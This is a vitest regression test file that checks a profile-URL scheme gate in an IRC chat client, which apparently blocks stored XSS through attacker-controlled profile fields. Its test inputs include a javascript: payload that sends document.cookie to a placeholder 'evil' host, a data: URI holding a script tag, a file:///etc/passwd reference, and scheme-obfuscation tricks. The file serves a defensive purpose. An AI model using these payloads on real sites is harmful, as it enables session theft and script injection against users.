// Security regression: profile URL/PICTURE fields (attacker-controlled via
// IRCX METADATA/WHOIS) must never be rendered as a clickable href / img src
// unless their scheme is http(s). A `javascript:` profile URL executes on
// click (target="_blank"/rel do NOT stop a javascript: URI), so the anchor
// must fail closed to inert plain text. See darkbear-audit/11-security-xcut.md.

import { describe, it, expect } from 'vitest';
import { isSafeProfileUrl } from './UserProfileCard';

describe('isSafeProfileUrl — profile URL scheme gate (fail-closed)', () => {
  it('accepts http and https', () => {
    expect(isSafeProfileUrl('https://example.com/me')).toBe(true);
    expect(isSafeProfileUrl('http://example.com')).toBe(true);
    expect(isSafeProfileUrl('HTTPS://Example.COM/x')).toBe(true);
  });

  it('rejects javascript: (the stored-XSS payload)', () => {
    expect(isSafeProfileUrl('javascript:alert(1)')).toBe(false);
    expect(
      isSafeProfileUrl("javascript:fetch('//evil/x?c='+document.cookie)"),
    ).toBe(false);
  });

  it('rejects data:, vbscript:, blob:, file: schemes', () => {
    expect(isSafeProfileUrl('data:text/html,<script>alert(1)</script>')).toBe(false);
    expect(isSafeProfileUrl('vbscript:msgbox(1)')).toBe(false);
    expect(isSafeProfileUrl('blob:https://x/abc')).toBe(false);
    expect(isSafeProfileUrl('file:///etc/passwd')).toBe(false);
  });

  it('rejects scheme-obfuscation with whitespace / control chars', () => {
    // URL() strips leading/embedded control chars + whitespace, so these still
    // resolve to the javascript: scheme and must be rejected.
    expect(isSafeProfileUrl('  javascript:alert(1)')).toBe(false);
    expect(isSafeProfileUrl('java\tscript:alert(1)')).toBe(false);
    expect(isSafeProfileUrl('java\nscript:alert(1)')).toBe(false);
    expect(isSafeProfileUrl('\x01javascript:alert(1)')).toBe(false);
  });

  it('rejects empty / nullish / non-absolute values (fail-closed)', () => {
    expect(isSafeProfileUrl(undefined)).toBe(false);
    expect(isSafeProfileUrl(null)).toBe(false);
    expect(isSafeProfileUrl('')).toBe(false);
    expect(isSafeProfileUrl('   ')).toBe(false);
    expect(isSafeProfileUrl('not a url')).toBe(false);
    expect(isSafeProfileUrl('/relative/path')).toBe(false);
  });
});
